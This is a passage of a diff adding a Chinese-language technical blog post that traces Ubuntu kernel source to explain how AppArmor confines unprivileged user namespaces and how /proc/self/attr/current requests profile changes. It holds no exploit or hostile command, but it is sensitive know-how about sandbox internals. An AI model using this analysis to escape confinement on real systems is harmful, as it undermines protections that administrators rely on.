+      <li><code class="language-plaintext highlighter-rouge">unprivileged_userns</code> 設定檔限制程式使用 <code class="language-plaintext highlighter-rouge">sys_admin</code> capability。</li>
+      <li>而 <code class="language-plaintext highlighter-rouge">unshare</code> 建立使用者命名空間時需要用到 <code class="language-plaintext highlighter-rouge">sys_admin</code>，因此被 AppArmor 阻擋，最終導致 <strong>“Operation not permitted (-EPERM)”</strong> 錯誤。</li>
+    </ul>
+  </li>
+</ol>
+
+<p>在 Ubuntu 中，所有的 AppArmor 設定檔都放在 <code class="language-plaintext highlighter-rouge">/etc/apparmor.d/</code> 目錄底下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/apparmor.d/
+total 528
+drwxr-xr-x   9 root root  4096 Feb 17 10:46 <span class="nb">.</span>
+drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
+<span class="nt">-rw-r--r--</span>   1 root root   354 Oct  2 07:24 1password
+...
+<span class="nt">-rw-r--r--</span>   1 root root   699 Oct  2 07:24 unprivileged_userns
+...
+</code></pre></div></div>
+
+<p>檔案 <code class="language-plaintext highlighter-rouge">/etc/apparmor.d/unprivileged_userns</code> 定義了 AppArmor 的 <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> 設定檔。以下是該檔案部分內容的說明：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+
+profile unprivileged_userns {
+     audit deny capability,
+     audit deny change_profile,
+
+     [...]
+     allow mqueue,
+     allow ptrace,
+     allow userns,
+}
+</code></pre></div></div>
+
+<p>我們在 <code class="language-plaintext highlighter-rouge">dmesg</code> 命令中看到的第二筆事件，正是由 <code class="language-plaintext highlighter-rouge">audit deny capability</code> 規則所產生。這條規則會阻擋所有需要特定 capabilities（例如 <code class="language-plaintext highlighter-rouge">CAP_SYS_ADMIN</code>、<code class="language-plaintext highlighter-rouge">CAP_NET_ADMIN</code> 和 <code class="language-plaintext highlighter-rouge">CAP_CHOWN</code>）的操作，並記錄任何被拒絕的請求。</p>
+
+<p>既然我們已經確認在 <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> 設定檔下，建立非特權使用者命名空間是被禁止的，那接下來最關鍵的問題就是：
+<strong>為什麼原本處於 <code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔的程式，會自動被轉換到 <code class="language-plaintext highlighter-rouge">unprivileged_userns</code>？</strong></p>
+
+<p>為了解答這個問題，我們需要深入了解 Ubuntu 是如何使用 AppArmor 來實作沙盒！</p>
+
+<h2 id="3-investigating-ubuntu-kernel-patch">3. Investigating Ubuntu Kernel Patch</h2>
+
+<h3 id="31-analysis-strategy">3.1. Analysis Strategy</h3>
+
+<p>每個 Linux 發行版都會根據自身需求修改 Linux 核心，Ubuntu 當然也不例外。</p>
+
+<p>在分析 Ubuntu 的原始碼時，一共會下載兩個檔案：一是 Linux 原始碼的基礎版本（例如 <code class="language-plaintext highlighter-rouge">linux_&lt;ver&gt;.orig.tar.gz</code>），另一個則是 Ubuntu 自行維護的修改差異檔（例如 <code class="language-plaintext highlighter-rouge">linux_&lt;ver&gt;-&lt;x&gt;.&lt;y&gt;.diff.gz</code>，其中 x 是 Ubuntu 的內部維護版本號，y 則通常是次要版本或修補版本）。若要分析 Ubuntu 的客製化行為，通常會搭配這個差異檔來檢查套用後的核心原始碼。</p>
+
+<p>但就拿 <code class="language-plaintext highlighter-rouge">linux_6.11.0-18.18.diff</code> 這個檔案來說，與基礎版本的差異超過 26 萬行。我們要從何下手？</p>
+
+<p>透過一些經驗法則能大幅縮小要分析的範圍：像這次 AppArmor 的異常行為，只有在建立非特權使用者命名空間時觸發，因此只要分析與該操作有關的程式碼就好；此外，也可以從事件中出現的關鍵字下手，像是搜尋特定字串，就能快速定位到實際負責執行該邏輯的核心程式碼。</p>
+
+<h3 id="32-diving-into-the-source">3.2. Diving Into the Source</h3>
+
+<p>當使用者建立命名空間時，AppArmor 會觸發 hook 函數 <code class="language-plaintext highlighter-rouge">apparmor_userns_create()</code> [1]，這個函數是 AppArmor 為建立命名空間所設計的安全檢查點。接著，<code class="language-plaintext highlighter-rouge">apparmor_userns_create()</code> 會呼叫另一個函數 <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> [2]，負責處理與命名空間權限相關的設定與判斷。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="n">apparmor_hooks</span><span class="p">[]</span> <span class="n">__ro_after_init</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">LSM_HOOK_INIT</span><span class="p">(</span><span class="n">userns_create</span><span class="p">,</span> <span class="n">apparmor_userns_create</span><span class="p">),</span> <span class="c1">// [1]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">apparmor_userns_create</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">new_cred</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">label</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">label</span> <span class="o">=</span> <span class="n">begin_current_label_crit_section</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">aa_unprivileged_userns_restricted</span> <span class="cm">/* default value: 1 */</span> <span class="o">||</span>
+        <span class="n">label_mediates</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">AA_CLASS_NS</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// [...]</span>
+
+        <span class="n">new</span> <span class="o">=</span> <span class="n">fn_label_build</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">profile</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+                <span class="n">aa_profile_ns_perm</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ad</span><span class="p">,</span> <span class="c1">// [2]</span>
+                           <span class="n">AA_USERNS_CREATE</span><span class="p">));</span>
+        <span class="c1">// [...]</span>
+    <span class="p">}</span>
+    <span class="n">end_current_label_crit_section</span><span class="p">(</span><span class="n">label</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">error</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>當 <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> 偵測到目前程式使用的設定檔處於 unconfined 狀態 [3] 且為 <code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔 [4] 時，它會直接指派程式成一個寫死的 <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> 設定檔 [5]。這個設定檔對應的就是 <code class="language-plaintext highlighter-rouge">/etc/apparmor.d/unprivileged_userns</code>，而也正是套用了設定檔，AppArmore 才阻止程式建立非特權使用者命名空間。</p>
+
+<p>下方是 <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> 函數的部分程式碼片段。完整的實作中包含了大量標註了 <strong>“TODO”</strong> 和 <strong>“hardcode”</strong> 的註解，顯示這整套機制目前仍在開發階段，許多行為其實還沒有正式定型。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="nf">aa_profile_ns_perm</span><span class="p">(</span><span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span><span class="p">,</span>
+                    <span class="k">struct</span> <span class="n">apparmor_audit_data</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span>
+                    <span class="n">u32</span> <span class="n">request</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_ruleset</span> <span class="o">*</span><span class="n">rules</span> <span class="o">=</span> <span class="n">list_first_entry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">rules</span><span class="p">,</span>
+                            <span class="n">typeof</span><span class="p">(</span><span class="o">*</span><span class="n">rules</span><span class="p">),</span> <span class="n">list</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">new</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">aa_perms</span> <span class="n">perms</span> <span class="o">=</span> <span class="p">{</span> <span class="p">};</span>
+    <span class="n">aa_state_t</span> <span class="n">state</span><span class="p">;</span>
+
+    <span class="c1">// [...]</span>
+    <span class="n">state</span> <span class="o">=</span> <span class="n">RULE_MEDIATES</span><span class="p">(</span><span class="n">rules</span><span class="p">,</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">class</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">profile_unconfined</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="c1">// [3]</span>
+            <span class="n">profile</span> <span class="o">==</span> <span class="n">profiles_ns</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">unconfined</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
+            <span class="c1">// [...]</span>
+            <span class="n">new</span> <span class="o">=</span> <span class="n">aa_label_parse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">label</span><span class="p">,</span> <span class="c1">// [5]</span>
+                         <span class="s">"unprivileged_userns"</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+                         <span class="nb">true</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
+            <span class="c1">// [...]</span>
+            <span class="n">ad</span><span class="o">-&gt;</span><span class="n">info</span> <span class="o">=</span> <span class="s">"Userns create - transitioning profile"</span><span class="p">;</span>
+            <span class="n">perms</span><span class="p">.</span><span class="n">audit</span> <span class="o">=</span> <span class="n">request</span><span class="p">;</span>
+            <span class="n">perms</span><span class="p">.</span><span class="n">allow</span> <span class="o">=</span> <span class="n">request</span><span class="p">;</span>
+            <span class="k">goto</span> <span class="n">hard_coded</span><span class="p">;</span>
+        <span class="p">}</span> <span class="cm">/* [...] */</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+<span class="nl">hard_coded:</span>
+    <span class="n">aa_apply_modes_to_perms</span><span class="p">(</span><span class="n">profile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perms</span><span class="p">);</span>
+    <span class="c1">// [...]</span>
+    <span class="k">return</span> <span class="n">new</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>要怎麼判斷目前程式所使用的 AppArmor 設定檔呢？直覺上，這類資訊應該會被記錄在 <code class="language-plaintext highlighter-rouge">/proc/self/</code> 底下的某個檔案中。透過分析原始碼，並搭配 <code class="language-plaintext highlighter-rouge">grep</code> 和 <code class="language-plaintext highlighter-rouge">find</code> 等工具搜尋關鍵字後，我們找到了目標位置：<code class="language-plaintext highlighter-rouge">/proc/self/attr</code>。</p>
+
+<p>這個目錄用來儲存程式的屬性設定，其中有一個子目錄名為 <code class="language-plaintext highlighter-rouge">apparmor</code>，專門存放與 AppArmor 有關的資訊。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /proc/self/attr
+total 0
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 <span class="nb">.</span>
+dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 current
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 <span class="nb">exec</span>
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 fscreate
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 keycreate
+<span class="nt">-r--r--r--</span> 1 aaa aaa 0 Feb 17 12:16 prev
+dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
+<span class="nt">-rw-rw-rw-</span> 1 aaa aaa 0 Feb 17 12:16 sockcreate
+</code></pre></div></div>
+
+<p>在 <code class="language-plaintext highlighter-rouge">/proc/self/attr/apparmor</code> 目錄下的 <code class="language-plaintext highlighter-rouge">current</code> 檔案，用來顯示當前程式所使用的 AppArmor 設定檔。雖然這個檔案具備寫入權限，但實際上要讓修改生效，必須使用特定格式寫入內容，否則系統會忽略這些操作。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">cat</span> /proc/self/attr/current
+unconfined
+
+aaa@aaa:~/<span class="nv">$ </span><span class="nb">echo </span>AAA <span class="o">&gt;</span> /proc/self/attr/current
+<span class="nt">-bash</span>: <span class="nb">echo</span>: write error: Invalid argument
+</code></pre></div></div>
+
+<p>透過將這些檔案名稱對應回原始碼，我們可以從檔案操作的定義中，找出處理讀寫請求的函式，進而了解這些檔案實際上是如何被使用的。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ATTR(LSMID, NAME, MODE)             \
+    NOD(NAME, (S_IFREG|(MODE)),             \
+        NULL, &amp;proc_pid_attr_operations,    \
+        { .lsmid = LSMID })
+</span>
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">smack_attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_SMACK</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">),</span>
+<span class="p">};</span>
+<span class="n">LSM_DIR_OPS</span><span class="p">(</span><span class="n">smack</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">apparmor_attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span>  <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"prev"</span><span class="p">,</span>     <span class="mo">0444</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_APPARMOR</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">,</span>     <span class="mo">0666</span><span class="p">),</span>
+<span class="p">};</span>
+<span class="n">LSM_DIR_OPS</span><span class="p">(</span><span class="n">apparmor</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">pid_entry</span> <span class="n">attr_dir_stuff</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"current"</span><span class="p">,</span>     <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"prev"</span><span class="p">,</span>        <span class="mo">0444</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">,</span>        <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"fscreate"</span><span class="p">,</span>    <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"keycreate"</span><span class="p">,</span>   <span class="mo">0666</span><span class="p">),</span>
+    <span class="n">ATTR</span><span class="p">(</span><span class="n">LSM_ID_UNDEF</span><span class="p">,</span> <span class="s">"sockcreate"</span><span class="p">,</span>  <span class="mo">0666</span><span class="p">),</span>
+    <span class="kt">DIR</span><span class="p">(</span><span class="s">"smack"</span><span class="p">,</span>  <span class="mo">0555</span><span class="p">,</span>
+        <span class="n">proc_smack_attr_dir_inode_ops</span><span class="p">,</span> <span class="n">proc_smack_attr_dir_ops</span><span class="p">),</span>
+    <span class="kt">DIR</span><span class="p">(</span><span class="s">"apparmor"</span><span class="p">,</span>  <span class="mo">0555</span><span class="p">,</span>
+        <span class="n">proc_apparmor_attr_dir_inode_ops</span><span class="p">,</span> <span class="n">proc_apparmor_attr_dir_ops</span><span class="p">),</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>變數 <code class="language-plaintext highlighter-rouge">proc_pid_attr_operations</code> 是這些檔案所使用的檔案操作表，其中寫入行為會由函式 <code class="language-plaintext highlighter-rouge">proc_pid_attr_write()</code> [6] 處理。往下追蹤這個函式的實作，可以看到它會呼叫 LSM 中的 <code class="language-plaintext highlighter-rouge">setprocattr</code> hook，而對應到 AppArmor 的實作就是 <code class="language-plaintext highlighter-rouge">apparmor_setprocattr()</code> [7]。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">proc_pid_attr_operations</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="p">.</span><span class="n">write</span>        <span class="o">=</span> <span class="n">proc_pid_attr_write</span><span class="p">,</span> <span class="c1">// [6]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">proc_pid_attr_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span> <span class="n">buf</span><span class="p">,</span>
+                   <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="n">security_setprocattr</span><span class="p">(</span><span class="n">PROC_I</span><span class="p">(</span><span class="n">inode</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">.</span><span class="n">lsmid</span><span class="p">,</span> <span class="c1">// &lt;------------</span>
+                  <span class="n">file</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span>
+                  <span class="n">count</span><span class="p">);</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">security_setprocattr</span><span class="p">(</span><span class="kt">int</span> <span class="n">lsmid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
+
+    <span class="n">hlist_for_each_entry</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">security_hook_heads</span><span class="p">.</span><span class="n">setprocattr</span><span class="p">,</span> <span class="n">list</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lsmid</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">lsmid</span> <span class="o">!=</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">lsmid</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="k">return</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">hook</span><span class="p">.</span><span class="n">setprocattr</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// &lt;------------</span>
+    <span class="p">}</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="k">struct</span> <span class="n">security_hook_list</span> <span class="n">apparmor_hooks</span><span class="p">[]</span> <span class="n">__ro_after_init</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="n">LSM_HOOK_INIT</span><span class="p">(</span><span class="n">setprocattr</span><span class="p">,</span> <span class="n">apparmor_setprocattr</span><span class="p">),</span> <span class="c1">// [7]</span>
+    <span class="c1">// [...]</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>函式 <code class="language-plaintext highlighter-rouge">apparmor_setprocattr()</code> 首先會將目標屬性的名稱轉換成對應的列舉值 [8]，接著再呼叫 <code class="language-plaintext highlighter-rouge">do_setattr()</code> 來實際處理該操作 [9]。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">apparmor_setprocattr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span>
+                <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">attr</span> <span class="o">=</span> <span class="n">lsm_name_to_attr</span><span class="p">(</span><span class="n">name</span><span class="p">);</span> <span class="c1">// [8]</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">attr</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">do_setattr</span><span class="p">(</span><span class="n">attr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// [9]</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">u64</span> <span class="nf">lsm_name_to_attr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"current"</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">LSM_ATTR_CURRENT</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">LSM_ATTR_EXEC</span><span class="p">;</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">do_setattr()</code> 函式會先是解析寫入的輸入資料，其格式為：<code class="language-plaintext highlighter-rouge">"&lt;操作&gt; &lt;設定檔名稱&gt;"</code>。接著，它會根據被寫入的檔案與操作種類，來決定呼叫 <code class="language-plaintext highlighter-rouge">aa_change_profile()</code> 時所使用的參數，以執行對應的設定檔切換或操作。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_setattr</span><span class="p">(</span><span class="n">u64</span> <span class="n">attr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// [...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">attr</span> <span class="o">==</span> <span class="n">LSM_ATTR_CURRENT</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// [...]</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"changeprofile"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_NOFLAGS</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"permprofile"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_TEST</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"stack"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_STACK</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span>
+            <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">attr</span> <span class="o">==</span> <span class="n">LSM_ATTR_EXEC</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"exec"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">AA_CHANGE_ONEXEC</span><span class="p">);</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"stack"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="n">aa_change_profile</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="p">(</span><span class="n">AA_CHANGE_ONEXEC</span> <span class="o">|</span>
+                             <span class="n">AA_CHANGE_STACK</span><span class="p">));</span>
+        <span class="k">else</span>
+            <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">aa_change_profile()</code> 會根據不同的 flag 來決定如何套用指定的設定檔。首先，它會根據使用者輸入的設定檔名稱，找出對應的設定檔物件 [10]，然後根據 flag 的內容執行不同的更新邏輯。若包含 <code class="language-plaintext highlighter-rouge">AA_CHANGE_STACK</code> flag，AppArmor 會將新的設定疊加在現有設定檔之上。若是 <code class="language-plaintext highlighter-rouge">AA_CHANGE_TEST</code> flag，則代表這次操作僅用於測試，並不會真正套用設定檔。</p>
+
+<p>如果既沒有設定 <code class="language-plaintext highlighter-rouge">AA_CHANGE_STACK</code>，也沒有設定 <code class="language-plaintext highlighter-rouge">AA_CHANGE_TEST</code>，<code class="language-plaintext highlighter-rouge">aa_change_profile()</code> 會使用剛剛取得的設定檔建立一個新的 AppArmor 標籤（label）物件 [11]，然後透過 <code class="language-plaintext highlighter-rouge">aa_replace_current_label()</code> [12] 或 <code class="language-plaintext highlighter-rouge">aa_set_current_onexec()</code> [13] 將這個新標籤套用到目前的程式上。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">aa_change_profile</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fqname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="n">label</span><span class="p">,</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    
+    <span class="c1">// [...]</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">aa_label_parse</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">fqname</span> <span class="cm">/* profile name */</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span> <span class="c1">// [10]</span>
+
+    <span class="c1">// [...]</span>
